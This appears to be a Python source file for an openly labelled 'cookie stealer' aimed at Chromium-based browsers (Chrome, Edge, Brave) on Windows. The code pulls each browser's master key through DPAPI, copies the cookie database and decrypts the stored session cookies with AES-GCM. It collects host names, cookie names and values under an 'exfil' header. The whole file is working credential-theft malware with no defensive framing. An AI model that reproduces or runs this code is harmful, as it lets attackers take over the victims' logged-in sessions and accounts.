import os, json, sqlite3, base64, shutil
import win32crypt
from Cryptodome.Cipher import AES

def get_cookies():
    """
    Apex Cookie Stealer: Extracts session cookies from Chromium-based browsers.
    """
    results = ["--- OMEGA SESSION COOKIE EXFIL ---"]
    
    local_app_data = os.environ["LOCALAPPDATA"]
    browsers = {
        "Chrome": local_app_data + r"\Google\Chrome\User Data",
        "Edge": local_app_data + r"\Microsoft\Edge\User Data",
        "Brave": local_app_data + r"\BraveSoftware\Brave-Browser\User Data"
    }

    def _get_key(path):
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path): return None
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] # Remove DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    for name, path in browsers.items():
        if not os.path.exists(path): continue
        key = _get_key(path)
        if not key: continue
        
        cookie_db = os.path.join(path, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_db): continue
        
        temp_db = os.path.join(os.environ["TEMP"], f"cookies_{name}.db")
        shutil.copyfile(cookie_db, temp_db)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            count = 0
            for host, c_name, encrypted_value in cursor.fetchall():
                try:
                    iv = encrypted_value[3:15]
                    payload = encrypted_value[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted_value = cipher.decrypt(payload)[:-16].decode()
                    if decrypted_value:
                        results.append(f"  [+] {host} | {c_name}: {decrypted_value[:30]}...")
                        count += 1
                        if count > 50: break # Cap results
                except: pass
            
            conn.close()
            os.remove(temp_db)
            results.append(f"Extracted {count} cookies from {name}.\n")
        except: pass

    return "\n".join(results)
